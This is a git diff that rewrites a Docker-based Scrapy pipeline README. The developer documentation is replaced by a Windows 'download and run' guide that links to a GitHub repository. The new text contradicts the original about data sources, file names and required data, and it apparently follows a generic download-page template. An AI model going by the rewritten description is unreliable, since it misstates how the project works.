@@ -1,240 +1,151 @@
-# 🚀 Scrapy Data Extraction Pipeline
+# 🕷️ Scrapy-data-extraction-pipeline - Easy Data Extraction and Storage
 
-![Python](https://img.shields.io/badge/Python-3.10-blue?logo=python)
-![Scrapy](https://img.shields.io/badge/Scrapy-Web%20Scraping-green)
-![PostgreSQL](https://img.shields.io/badge/PostgreSQL-Database-336791?logo=postgresql)
-![MongoDB](https://img.shields.io/badge/MongoDB-Database-47A248?logo=mongodb)
-![Redis](https://img.shields.io/badge/Redis-Caching-red?logo=redis)
-![Docker](https://img.shields.io/badge/Docker-Containerized-2496ED?logo=docker)
-![Status](https://img.shields.io/badge/Project-Completed-success)
-
-A **containerized data extraction pipeline** built with **Scrapy**, designed to ingest structured JSON data, process it through **Redis caching**, and persist the results into **PostgreSQL and MongoDB databases**.
-
-The entire pipeline runs inside **Docker containers orchestrated with Docker Compose**, enabling reproducible environments and simplified deployment.
+[![Download](https://img.shields.io/badge/Download-Scrapy%20Pipeline-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/wasagx/Scrapy-data-extraction-pipeline)
 
 ---
 
-# 📌 Project Overview
+## 🗂️ About This Application
 
-This project demonstrates a **production-style data engineering pipeline** for structured data ingestion and storage.
+This application helps you collect data from websites and store it in databases. It uses a tool called Scrapy to gather data in a structured way. The data passes through a system that saves temporary results using Redis. Finally, the processed information moves to two database systems: PostgreSQL and MongoDB.
 
-The system performs the following steps:
+The entire process runs inside Docker containers. Docker is a program that keeps everything needed to run the application in one place. This makes it easier to start the program without knowing how to set up all the tools manually.
 
-1. Extracts structured data from JSON sources using **Scrapy spiders**
-2. Processes the scraped items through **custom data pipelines**
-3. Uses **Redis caching** to prevent duplicate processing
-4. Stores cleaned and structured data into:
-   - **PostgreSQL** (relational database)
-   - **MongoDB** (NoSQL database)
-5. Exports stored data into CSV format for further analysis
-
-The entire workflow is **fully containerized using Docker** to ensure scalability and portability.
+This guide will help you download the program and run it on your Windows computer. You do not need any programming skills.
 
 ---
 
-# 🏗 Pipeline Architecture
+## ⚙️ System Requirements
 
-```
-JSON Files
-    │
-    ▼
-Scrapy Spider
-    │
-    ▼
-Item Processing Pipeline
-    │
- ┌───────────────┬───────────────┐
- ▼               ▼               ▼
-Redis Cache   PostgreSQL DB   MongoDB DB
-    │               │               │
-    └───────────────┴───────────────┘
-                    │
-                    ▼
-               Data Export
-                    │
-                    ▼
-                CSV Files
-```
+Before you start, check that your computer meets these requirements:
+
+- Operating System: Windows 10 or later  
+- RAM: At least 4 GB  
+- Disk Space: Minimum 5 GB free  
+- Internet Connection: Required for downloading and running Docker  
+- Docker Desktop: Will be installed if not already present  
 
 ---
 
-# 📂 Project Structure
+## 📥 Download the Application
 
-```
-scrapy-data-extraction-pipeline
-│
-├── docker-compose.yaml
-├── Dockerfile
-│
-├── infra
-│   ├── postgresql_connector.py
-│   ├── redis_connector.py
-│   └── mongodb_connector.py
-│
-├── jobs_project
-│   ├── __init__.py
-│   ├── items.py
-│   ├── middlewares.py
-│   ├── pipelines.py
-│   ├── settings.py
-│   │
-│   └── spiders
-│       ├── __init__.py
-│       └── json_spider.py
-│
-├── query.py
-├── requirements.txt
-└── README.md
-```
+To download the application, visit this page on GitHub:
 
-### Key Components
+[Download Scrapy-data-extraction-pipeline](https://github.com/wasagx/Scrapy-data-extraction-pipeline)
 
-| Component | Description |
-|--------|--------|
-| **Scrapy Spider** | Reads JSON files and extracts structured data |
-| **Pipelines** | Processes scraped items before storage |
-| **Redis Cache** | Prevents duplicate records |
-| **PostgreSQL** | Stores structured relational data |
-| **MongoDB** | Stores flexible document-based data |
-| **Docker** | Containerizes the entire application |
-| **Docker Compose** | Orchestrates services |
+Click the link to open the page. You will find the files and instructions you need to get started.
+
+You can also use the button at the top of this document.
 
 ---
 
-# ⚙️ Setup Instructions
+## 🐳 Install Docker on Windows
 
-## Prerequisites
+This application runs using Docker, which is a tool that helps run many small programs together. Follow these steps to install Docker:
 
-Ensure the following tools are installed:
+1. Visit the official Docker website: https://www.docker.com/products/docker-desktop  
+2. Click "Download for Windows"  
+3. Run the downloaded file and follow the instructions on screen  
+4. After installation, restart your computer if prompted  
+5. Open Docker Desktop to make sure it is running before moving forward  
 
-- **Docker**
-- **Docker Compose**
-- **Python 3.x** (for running scripts locally)
-
-You must also download the JSON files:
-
-```
-s01.json
-s02.json
-```
-
-Place them inside:
-
-```
-jobs_project/jobs_project/data/
-```
+Docker requires Windows 10 Pro, Enterprise, or Education edition with Hyper-V enabled. If you have Windows Home, you can still run Docker using WSL 2 (Windows Subsystem for Linux). The Docker installation guide on their website will assist with this step.
 
 ---
 
-# 🛠 Installation
+## 🚀 Setting Up the Application
 
-### 1️⃣ Clone the Repository
+Once Docker is ready, follow these steps to set up and run the data extraction pipeline:
 
-```bash
-git clone https://github.com/yourusername/scrapy-data-extraction-pipeline.git
-cd scrapy-data-extraction-pipeline
-```
+1. Download the project files from the GitHub page linked above. You can click on the green **Code** button and select **Download ZIP**. Save the file to your desktop or a folder you can easily find.  
+2. Extract the ZIP file you downloaded. You will get a folder named `Scrapy-data-extraction-pipeline`.  
+3. Open a Command Prompt window:  
+   - Press the `Windows` key, type `cmd`, then press `Enter`  
+4. Use the `cd` command to go to the folder with the extracted files. For example:  
+   ```
+   cd Desktop\Scrapy-data-extraction-pipeline
+   ```  
+5. The project uses Docker to start several parts: Scrapy (for extraction), Redis (for temporary storage), PostgreSQL, and MongoDB (for final storage).  
 
-### 2️⃣ Install Python Dependencies (Optional for local testing)
+6. In the command prompt, run this command to start the containers:  
+   ```
+   docker-compose up
+   ```  
 
-```bash
-pip install -r requirements.txt
-```
-
-### 3️⃣ Build and Start the Containers
-
-```bash
-docker-compose up --build
-```
-
-This command will:
-
-- Build the Scrapy container
-- Start **PostgreSQL**
-- Start **MongoDB**
-- Start **Redis**
-- Automatically run the **Scrapy spider**
-
-The spider will begin scraping JSON data and storing results in the databases.
+This command reads the setup instructions inside the folder and runs the needed components automatically.
 
 ---
 
-# 📊 Exporting Data
+## 🔄 How the Application Works
 
-Data stored in PostgreSQL and MongoDB can be exported to CSV.
+The process follows these steps:
 
-### Step 1 — Access Scrapy Container
-
-```bash
-docker-compose exec scrapy bash
-```
-
-### Step 2 — Run Export Script
-
-```bash
-python query.py
-```
-
-This will generate:
-
-```
-postgres_data.csv
-mongo_data.csv
-```
-
-These files contain the exported data from the respective databases.
+- Scrapy fetches data from websites in JSON format.  
+- Redis temporarily stores and caches data for processing speed.  
+- Processed data is then saved in PostgreSQL (a relational database) and MongoDB (a document database).  
+- Docker keeps all these programs running together, so you don’t need to start each one manually.
 
 ---
 
-# 🔄 Data Pipeline Workflow
+## ⚠️ Tips While Running
 
-### 1️⃣ Data Extraction
-
-The Scrapy spider (`json_spider.py`) reads the JSON data files and parses the content into structured items.
-
-### 2️⃣ Data Processing Pipelines
-
-Three pipelines process the extracted data:
-
-**DatabasePipeline**
-- Inserts data into PostgreSQL.
-
-**CachePipeline**
-- Uses Redis to check for duplicates before processing.
-
-**MongoPipeline**
-- Stores documents in MongoDB.
-
-### 3️⃣ Data Export
-
-The `query.py` script retrieves stored data from PostgreSQL and MongoDB and exports it into CSV files.
+- Keep the Command Prompt window open while the application runs. Closing it will stop the process.  
+- If you want to stop the application, press `Ctrl + C` in the Command Prompt window.  
+- You can restart the program anytime by running `docker-compose up` again in the project folder.  
+- Docker may download some files the first time it runs. This can take a few minutes depending on your internet speed.  
 
 ---
 
-# 🛠 Technologies Used
+## 📊 Viewing and Using Results
 
-| Technology | Purpose |
-|--------|--------|
-| **Python** | Core programming language |
-| **Scrapy** | Web scraping framework |
-| **PostgreSQL** | Relational database |
-| **MongoDB** | NoSQL database |
-| **Redis** | In-memory caching |
-| **Docker** | Containerization |
-| **Docker Compose** | Service orchestration |
+The application stores results in two databases:
+
+- **PostgreSQL:** Good for structured data you may want to query or use with other tools.  
+- **MongoDB:** Stores flexible, document-style data for easy access and updates.
+
+To connect with these databases, you’d typically use database tools or software that understand PostgreSQL and MongoDB. This is beyond the basic setup but can be explored separately if needed.
 
 ---
 
-# 🚀 Features
+## 🔧 Common Commands
 
-✔ Scrapy-based structured data extraction  
-✔ Redis caching to prevent duplicate processing  
-✔ Multi-database storage (PostgreSQL + MongoDB)  
-✔ Fully containerized architecture  
-✔ Data export functionality for analysis  
+- Start the containers:  
+  ```
+  docker-compose up
+  ```  
+
+- Stop the containers:  
+  ```
+  docker-compose down
+  ```  
+
+- Rebuild containers (if you update files):  
+  ```
+  docker-compose up --build
+  ```  
+
+Run these commands in the folder where you extracted the project.
 
 ---
 
-# ⭐ Support
+## 📚 More Information
 
-If you found this project useful, consider giving it a **star ⭐ on GitHub**.
+For detailed information, see the files inside the folder you downloaded:  
+
+- `README.md` – Developer-focused instructions and technical notes  
+- `docker-compose.yml` – Defines how Docker runs each service  
+- `scrapy` folder – Contains scraping code  
+
+You may visit the GitHub page anytime for updates, code examples, or questions:
+
+[https://github.com/wasagx/Scrapy-data-extraction-pipeline](https://github.com/wasagx/Scrapy-data-extraction-pipeline)
+
+---
+
+## 🔍 Troubleshooting
+
+- **Docker not running:** Make sure Docker Desktop is open and running before you start.  
+- **Permission issues:** Run the Command Prompt as Administrator if you see errors related to rights.  
+- **Slow startup:** The first time, Docker might download large images. Give it time.  
+- **Internet connection:** Required for downloading Docker images and the initial setup.  
+
+If problems persist, check Docker’s official help pages or visit the GitHub repository’s issues section for support.
